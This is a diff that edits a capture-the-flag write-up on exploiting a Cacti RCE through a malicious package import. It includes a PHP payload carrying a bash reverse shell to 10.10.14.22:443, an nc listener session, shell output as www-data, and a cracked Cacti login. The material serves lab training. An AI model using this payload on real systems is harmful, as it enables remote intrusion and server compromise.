@@ -446,7 +446,7 @@ This password works for the Cacti login -> `admin/greencacti2001`
 
 If we remember, before exploiting the `SQL Injection`, we had found an `RCE` vulnerability in this Cacti version.
 
-Afther further research, we found a very useful [POC](https://github.com/Cacti/cacti/security/advisories/GHSA-7cmj-g5qc-pj88) in Cacti's security advisories on GitHub.
+After further research, we found a very useful [POC](https://github.com/Cacti/cacti/security/advisories/GHSA-7cmj-g5qc-pj88) in Cacti's security advisories on GitHub.
 
 <br />
 
@@ -478,21 +478,21 @@ system("cat test.xml | gzip -9 > test.xml.gz; rm test.xml");
 
 <br />
 
-As we can see, the `POC` is a php script that is going to create a `.xml.gz` file with malicious `php` code inside.
+As we can see, the `POC` is a PHP script that is going to create a `.xml.gz` file with malicious `PHP` code inside.
 
-Once the file is created, we need to `upload` it to Cacti in the "import package" section and access the upload path to `run` the command.
+Once the file is created, we need to `upload` it to Cacti in the "import package" section and access the upload path to `execute` the command.
 
-Before run the script, we're going to replace the "$filedata" content with a bash reverse shell:
+Before running the script, we're going to replace the "$filedata" content with a bash reverse shell:
 
 <br />
 
 ```php
-$filedata = "<?php system('bash -c \"bash -i >& /dev/tcp/10.10.14.22/443 0>&1\"'); ?>")
+$filedata = "<?php system('bash -c \"bash -i >& /dev/tcp/10.10.14.22/443 0>&1\"'); ?>");
 ```
 
 <br />
 
-Then, we run the php `exploit` to create the file:
+Then, we run the PHP `exploit` to create the file:
 
 <br />
 
@@ -524,3 +524,27 @@ And we upload it:
 
 <br />
 
+Finally, we start a listener and access the `/cacti/resource/test.php` path to run our reverse shell:
+
+<br />
+
+```bash
+❯ nc -nvlp 443
+listening on [any] 443 ...
+connect to [10.10.14.22] from (UNKNOWN) [10.10.11.30] 58674
+bash: cannot set terminal process group (1153): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@monitorsthree:~/html/cacti/resource$ id
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+<br />
+
+Once we access the uploaded PHP file, we successfully receive a bash reverse shell as the `www-data` user.
+
+<br />
+
+# Privilege Escalation: www-data -> marcus
+
+<br />
